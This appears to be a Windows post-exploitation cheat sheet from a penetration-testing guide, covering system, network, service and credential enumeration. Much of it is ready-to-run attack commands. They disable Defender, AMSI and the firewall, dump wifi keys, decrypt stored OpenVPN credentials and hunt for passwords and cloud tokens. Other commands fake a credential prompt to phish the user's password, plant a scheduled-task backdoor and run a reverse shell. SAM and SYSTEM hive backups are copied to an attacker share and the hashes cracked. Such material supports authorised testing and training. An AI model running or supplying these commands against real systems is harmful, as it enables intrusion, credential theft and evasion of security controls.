# Enumeration

## System Information

### general system information

```
systeminfo
```

{% hint style="info" %}
one way to find out whether you are in a virtual environment or not is to check the output. for example the picture bellow is the output from a windows 10 machine in virtualbox:&#x20;
{% endhint %}

![](<../../../.gitbook/assets/image (67).png>)

for OS name and version ( can add any other filter too ) :

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

show information for a remote system ( used in domains ) :

```
systeminfo /S [ip or hostname]
```

environment variables:

```
set
Get-ChildItem Env: | ft Key,Value
```

###

### get a list of installed hot fixes

```
Get-HotFix
```

uninstall hot fixes (need permission):

```
wusa /uninstall /kb:1234512
```

patchs and updates:

```
wmic qfe
wmic qfe get Caption, Description, HotFixID, InstalledOn
```

list all drivers:

```
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

#### list kernel drivers

```
driverquery | findstr Kernel
```



### Kernel Exploits

Extract the output of the systeminfo command:

```
systeminfo > systeminfo.txt
```

Run [wesng](https://github.com/bitsadmin/wesng) to find potential exploits:

```
python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less
```

Cross-reference results with compiled exploits:

{% embed url="https://github.com/SecWiki/windows-kernel-exploits" %}

{% embed url="https://github.com/nomi-sec/PoC-in-GitHub" %}

​[https://github.com/abatchy17/WindowsExploit](https://github.com/abatchy17/WindowsExploits)



### SNMP configurations

check to see if there is any SNMP services running and find valid community strings:

```
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s 
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```

```
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP"
```

{% hint style="info" %}
for more information on windows registry hive and 'reg' commands refer to[ this section](https://7h3w4lk3r.gitbook.io/the-hive/network-attacks/windows/security-component/windows-registry) of the book.
{% endhint %}

### VNC configurations

```
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
```

### check  powershell version

```
REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
```

### navigate the registry with powershell

might require admin rights or higher privileges

```
PS C:\> cd HKLM:\
PS HKLM:\> ls
```

### get last system boot time

```
$os = Get-WmiObject win32_operatingsystem $uptime = (Get-Date) - $os.ConvertToDateTime($os.LastBootUpTime) Write-Output ("Last boot: " + $os.ConvertToDateTime($os.LastBootUpTime))
You can also run this single line to get last boot time
systeminfo | more
```

### powershell history <a href="powershell-history" id="powershell-history"></a>

```
ConsoleHost_history #Find the PATH where is saved
​
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### file system drives

```
wmic logicaldisk get caption || fsutil fsinfo drives
driverquery | findstr "File System"
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```

### mount / volumes

```
mountvol
```

## Logs and Audit Setting

### view system auditing setting

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### check if system logs are stored somewhere else:

```
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

view log categories:

```
wevtutil enum-logs
wevtutil el
```

### configuration for System log:

```
wevtutil gl System
```

general application logging info:

```
wevtutil gli Application
```

### check credential guard:

```
reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
```

### check cached credentials (domain):

```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## check for AVs

```
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | more 
```

### windows defender

if you have privileges:

```
# check status of Defender
PS C:\> Get-MpComputerStatus

# disable scanning all downloaded files and attachments, disable AMSI (reactive)
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
PS C:\> Set-MpPreference -DisableIOAVProtection $true

# disable AMSI (set to 0 to enable)
PS C:\> Set-MpPreference -DisableScriptScanning 1 

# exclude a folder
PS C:\> Add-MpPreference -ExclusionPath "C:\Temp"
PS C:\> Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
PS C:\> Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"

# remove signatures (if Internet connection is present, they will be downloaded again):
PS > "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
```

### applocker policy

```
Get-ApplockerPolicy -Effective -xml
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

Applocker Bypass:

* [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)
* [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md)
* [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md)

### check UAC

```
reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ 
```

[LOLBAS](https://lolbas-project.github.io/#) is a great collection of methods for a lot of windows post-exploitation and privilege escalation tasks including UAC bypass with windows built-in binaries.

{% embed url="https://github.com/hfiref0x/UACME" %}

## Network and Connections

```
netstat -ano
ipconfig /all
arp -a
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### extract wifi password

```
netsh wlan show profile
netsh wlan show profile <SSID> key=clear
```

one-liner to extract all APs at once:

```
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```

### routing info:

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### network shares

```
net share
Find-DomainShare -ComputerDomain domain.local
```

### firewall

```
# list firewall status and configs
netsh advfirewall firewall dump
# or 
netsh firewall show state
netsh firewall show config


# list blocked ports
$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports

# Disable Firewall on Windows 7 via cmd
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server"  /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Disable Firewall on Windows 7 via Powershell
powershell.exe -ExecutionPolicy Bypass -command 'Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value'`

# Disable Firewall on any windows via cmd
netsh firewall set opmode disable
netsh Advfirewall set allprofiles state off
```



## Users and Groups

Get current username

```
echo %USERNAME% || whoami
$env:username
```

### list privileges

```
whoami /priv
whoami /groups
```

### list all local users and groups

```
net user
whoami /all
net localgroup
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-WmiObject -Class Win32_UserAccount
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

local user home directories

```
dir C:\Users
Get-ChildItem C:\Users
```

### find local admins

```
net localgroup Administrators 
```

list logon requirements (useful for brute-forcing)

```
net accounts
```

get details about a user

```
net user [username]
```

get details about a group

```
net localgroup administrators
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### logged users/sessions

```
qwinsta
klist sessions
```

dump clipboard

```
powershell -command "Get-Clipboard"
```



## Software and Processes

### check 'always install elevated' (both should be enabled):

```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```

### list running processes

```
qprocess * 
tasklist
tasklist /m ntdll.dll
```

Find the list of processes launched by a user

```
tasklist /fi "username eq userName"
```

Find the memory usage of a specific process

```
tasklist /fi "pid eq processId"
tasklist /fi "pid eq 6544"
```

Get the list of services running in a process

```
tasklist /svc /fi "pid eq processId"
tasklist /svc /fi "pid eq 624"
```

Find processes that are running a specified image file:

```
tasklist /fi "imagename eq imageName"
tasklist /fi "imagename eq firefox.exe"
```

### Find the process running a specific service

```
tasklist /fi "services eq serviceName"
tasklist /fi "services eq webclient"
```

Kill a Task

```
taskkill -f /pid 1337
taskkill /IM notepad.exe
```

### list processes running as "system"

```
tasklist /v /fi "username eq system"
```

### installed programs (might need higher privileges)

```
wmic product get name, version, vendor
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE
​
Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

### show system-wide updates

```
wmic qfe get Caption, Description, HotFixID, InstalledOn
```

### uninstall software (if you have privileges)

```
wmic product where name="<NAME>" call uninstall /INTERACTIVE:OFF
```

## Services

### view/start/stop a service

```
net start
wmic service list brief
sc query
Get-Service
sc start [name]
sc config [name] start= demand
sc stop [name]
```

get services real name with net start output

```
sc getkeyname "service name"
```

check the required privilege level for each service.

```
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
```

check if you can modify registry entries of any services

```
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services
​
#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a
​
get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Check if **Authenticated Users** or **NT AUTHORITY\INTERACTIVE** have FullControl. In that case you can change the binary that is going to be executed by the service.

To change the Path of the binary executed:

```
reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### find all service executables

```
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\services.txt
```

if wmic is not available :

```
sc query state= all | findstr "SERVICE_NAME:" >> servicenames.txt
FOR /F "tokens=2 delims= " %i in (servicenames.txt) DO @echo %i >> services.txt
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
```

### search for unquoted service paths

```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

### check for weak service permissions

```
accesschk.exe -accepteula -wuvc "Everyone" *
accesschk.exe -accepteula -wuvc "Users" *
accesschk.exe -accepteula -wuvc "Authenticated Users" *
```

## Scheduled Tasks

### list scheduled tasks

```
schtasks /query /fo LIST /v
schtasks
```

### add startup scheduled tasks (useful for persistence)

```
schtasks /create /tn "MyCustomTask" /sc onlogon /tr "C:\users\Administrator\Desktop\backdoor.exe"

schtasks /create /tn "MyCustomTask" /sc onstart /tr "C:\users\Administrator\Desktop\backdoor.exe"
```



## Clear Text Credentials

### search for 'password' keyword in registry hives

```
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query "HKCU\Software\OpenSSH\Agent\Keys"
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### extract openssh keys from registry

#### [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

####

### find winlogon stored credentials (auto login)

```
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

if you find anything you can connect to the target from kali machine with this command:

```
winexe -U 'admin%password123' //192.168.1.22 cmd.exe
```

### find putty session stored credentials

```
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

### search windows credential manager

```
cmdkey /list
```

to use windows "runas" feature to get a reverse shell:

```
runas /savecred /user:admin C:\PrivEsc\reverse.exe 
```

### kindly asking user for credentials ( phishing )

```
powershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password"
```

or

```
powershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'admin',[Environment]::UserDomainName); $cred.getnetworkcredential().password"
```

### log files

```
# IIS
C:\inetpub\logs\LogFiles\*
​
#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### OpenVPN credentials

```
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}
​
foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]
​
  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes, 
    $entropy, 
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 
  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### IIS web server configurations

```
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config

Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

### search files for credentials

not as straight forward as linux, we first have to create a listing of all directories in the drive we want (usually C drive):

```
dir /b /a /s c:\ > cdirs.txt

/b → Uses bare format (no heading information or summary)
/a → Displays files with specified attributes
/s → Displays files in specified directory and all subdirectories
```

then we search this file to find directories and files that might be interesting:

```
type cdirs.txt | findstr /i password
type c:\rto\c-dirs.txt | findstr /i ssh
type c:\rto\c-dirs.txt | findstr /i kdbx
type c:\rto\c-dirs.txt | findstr /i vnc
```

some of the interesting directories/files in windows:

```
unattend.xml
Unattended.xml
sysprep.inf
sysprep.xml
VARIABLES.DAT
setupinfo
setupinfo.bak
web.config
SiteList.xml
.aws\credentials
.azure\accessTokens.json
.azure\azureProfile.json
gcloud\credentials.db
gcloud\legacy_credentials
gcloud\access_tokens.db
```

one-liner to check for credentials in all files

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```



### SAM and SYSTEM backups

The SAM and SYSTEM files are located in the C:\Windows\System32\config directory. The files are locked while Windows is running. Backups of the files may exist in the C:\Windows\Repair or C:\Windows\System32\config\RegBack directories.

if you find any backup files copy them to the attacker machine and use creddump7 to dump the hashes from SAM database:

```
copy C:\Windows\Repair\SAM \\192.168.1.11\tools\
copy C:\Windows\Repair\SYSTEM \\192.168.1.11\tools\

git clone https://github.com/Neohapsis/creddump7.git

python2 creddump7/pwdump.py SYSTEM SAM
```

you can try to crack the admin hash with hashcat:

```
hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
```

### Cloud Credentials <a href="cloud-credentials" id="cloud-credentials"></a>

```
##From user home.aws\credentialsAppData\Roaming\gcloud\credentials.dbAppData\Roaming\gcloud\legacy_credentialsAppData\Roaming\gcloud\access_tokens.db.azure\accessTokens.json.azure\azureProfile.json
```

### Tools that search for passwords <a href="tools-that-search-for-passwords" id="tools-that-search-for-passwords"></a>

​[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim. [**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatically search for all the files containing passwords mentioned in this page. [**Lazagne**](https://github.com/AlessandroZ/LaZagne) is another great tool to extract password from a system.

The tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) search for **sessions**, **usernames** and **passwords** of several tools that save this data in clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)

```
Import-Module path\to\SessionGopher.ps1;Invoke-SessionGopher -ThoroughInvoke-SessionGopher -AllDomain -oInvoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p [email protected]
```

## Files and Shares

### find files by name

```
gdr -PSProvider 'FileSystem' | %{ls -r $_.root} 2>$null | where { $_.name -eq "flag.txt"} -verbose
```

find all DOC files in C drive

```
Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination c:\temp}
```

### search for a string/regex in a file

```
type [file] | find /i "[string]"
type [file] | findstr [regex]
```

search for a file in a directory

```
dir /b /s [directory]\[file]
dir /b /s c:\wmic.exe
```

### find all files with a particular name:

```
Get-ChildItem "C:\Users\" -recurse -include *passwords*.txt
```

### show drives and disk info

```
fsutil fsinfo
```

tree map of a drive

```
tree C:\ /f /a > C:\output_of_tree.txt
```

### find writable files

```
accesschk.exe -uws "Everyone" "C:\Program Files"

Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}

Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone"}
```

### check for weak file permissions

```
accesschk.exe -uws "Everyone" "C:\Program Files" 
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

some important files to look for

```
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
```

### connect to a network share

```
net use K: \\<IP address\share IE C or Admin>  
net use K: \\192.168.31.53\C  <--this will connect to the K drive
net use K: \\192.168.31.53\C$ /user:george P@$$Word34 
```



